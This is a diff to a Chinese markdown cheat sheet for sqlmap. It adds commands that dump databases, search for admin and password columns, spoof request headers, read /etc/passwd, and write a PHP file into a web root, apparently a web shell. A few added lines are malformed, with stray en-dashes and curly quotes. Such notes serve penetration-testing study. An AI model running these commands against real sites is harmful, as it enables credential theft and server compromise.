@@ -15,20 +15,61 @@
 ```
 # 爆后端数据库, eg. mysql
 sqlmap.py -u url --dbms                                       
-sqlmap.py -u url  --dbms "后端数据库名"--dbs
+sqlmap.py -u url  --dbms "后端数据库名" --dbs
 # 爆数据库表
-sqlmap.py -u url  --dbms "后端数据库名"--tables  
+sqlmap.py -u url  --dbms "后端数据库名" --tables  
 # 显示当前连接数据库名               
-sqlmap.py -u url  --dbms "后端数据库名"--current-db   
+sqlmap.py -u url  --dbms "后端数据库名" --current-db   
 # 列出数据库表中的表名          
-sqlmap.py -u url --dbms "后端数据库名"--tables  -D "数据库名"   
+sqlmap.py -u url --dbms "后端数据库名" --tables  -D "数据库名"   
 # 列出数据库名中的表名内容                     
-sqlmap.py -u url --dbms "后端数据库名"--columns  -T "表名" -D "数据库名"   
+sqlmap.py -u url --dbms "后端数据库名" --columns  -T "表名" -D "数据库名"   
 # 获取字段里面的内容           
-sqlmap.py -u url --dbms "后端数据库名"--dump  -C "字段,字段"  -T "表名" -D "数据库名"   
+sqlmap.py -u url --dbms "后端数据库名" --dump  -C "字段,字段"  -T "表名" -D "数据库名" 
+# dmup
+sqlmap.py -u url --dbms "后端数据库名"--dump
+# 搜索特定字段 
+sqlmap.py -u url --dbms "后端数据库名" -D "数据库名" -search -C admin,password
 
 # referer 注入
-sqlmap -u url --referer=1 --level 3 -p referer    
+sqlmap -u url --referer=1 --level 3 -p referer 
+
+# 改header
+sqlmap --header="X-Forwarded-For: 127.0.0.1"
+# 改 host
+sqlmap --host="localhost" 
+
+# file-read读取web文件
+sqlmap -u url –file-read “/etc/passwd” -v 2
+
+# file-write写入文件到web
+sqlmap -u url –file-write /localhost/mm.php –file-dest /var/www/html/xx.php -v 2  
+```
+
+### 指定注入技术: `--technique=TECH`
+
+这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
+
+```
+B: Boolean-based blind SQL injection（布尔型注入）
+E: Error-based SQL injection（报错型注入）
+U: UNION query SQL injection（可联合查询注入）
+S: Stacked queries SQL injection（可多语句查询注入）
+T: Time-based blind SQL injection（基于时间延迟注入）
+```
+
+### `-v VERBOSE` 
+
+详细级别：0-6（默认为1）:
+
+```
+0：只显示Python的回溯，错误和关键消息。
+1：显示信息和警告消息。
+2：显示调试消息。
+3：有效载荷注入。
+4：显示HTTP请求。
+5：显示HTTP响应头。
+6：显示HTTP响应页面的内容
 ```
 
 ## 参数解析
